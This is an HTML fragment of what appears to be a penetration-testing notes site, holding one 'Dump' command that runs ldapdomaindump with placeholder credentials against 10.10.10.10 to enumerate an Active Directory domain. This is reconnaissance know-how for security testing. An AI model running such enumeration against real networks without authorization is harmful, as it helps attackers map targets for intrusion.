<h2 id="dump">Dump<a class="headerlink" href="#dump" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">ldapdomaindump</span> <span class="o">-</span><span class="n">u</span> <span class="n">example</span><span class="err">\</span><span class="n">example</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span>
</pre></div>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../0-cheatsheed/" title="Cheatsheet" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Cheatsheet
              </span>
            </div>
          </a>
        
        
          <a href="../api/" title="Windows API" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Windows API
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
      
    
  </body>
</html>